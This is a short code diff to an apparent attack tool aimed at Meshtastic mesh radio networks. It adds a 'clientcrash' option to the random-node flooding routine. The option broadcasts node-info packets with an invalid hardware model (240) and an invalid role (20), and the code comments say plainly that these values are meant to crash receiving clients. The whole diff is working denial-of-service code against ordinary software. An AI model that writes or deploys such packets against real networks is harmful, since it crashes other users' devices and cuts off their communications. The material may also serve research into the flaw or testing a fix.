@@ -143,7 +143,14 @@ void TMAttack::atkRndNode() {
     MC_NodeInfo nodeinfo = {};
     std::string none = "";
     std::string none2 = "";
-    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none2, esp_random() % 105);
+    uint8_t hw_model = esp_random() % 105;
+    if (flood_clientcrash == 1) {
+        hw_model = 240;  // invalid hw model to crash the client
+    }
+    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none2, hw_model);
+    if (flood_clientcrash == 1) {
+        nodeinfo.role = 20;  // invalid role to crash the client
+    }
     meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
     meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
     meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
